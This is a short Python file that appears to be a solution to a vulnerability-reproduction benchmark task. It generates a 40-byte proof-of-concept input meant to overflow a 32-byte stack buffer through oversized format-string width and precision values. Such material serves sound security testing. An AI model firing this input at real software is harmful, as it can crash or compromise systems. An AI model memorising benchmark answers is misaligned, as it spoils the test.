import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow.
        The vulnerability exists because constructing a format string with large width 
        and precision values (printed as decimal integers) can exceed the 32-byte buffer.
        Ground truth length is 40 bytes, corresponding to 5 64-bit words.
        We supply large positive integers (0x7f...) to maximize the printed length of 
        width and precision parameters (19 digits each), triggering the overflow.
        """
        return b'\x7f' * 40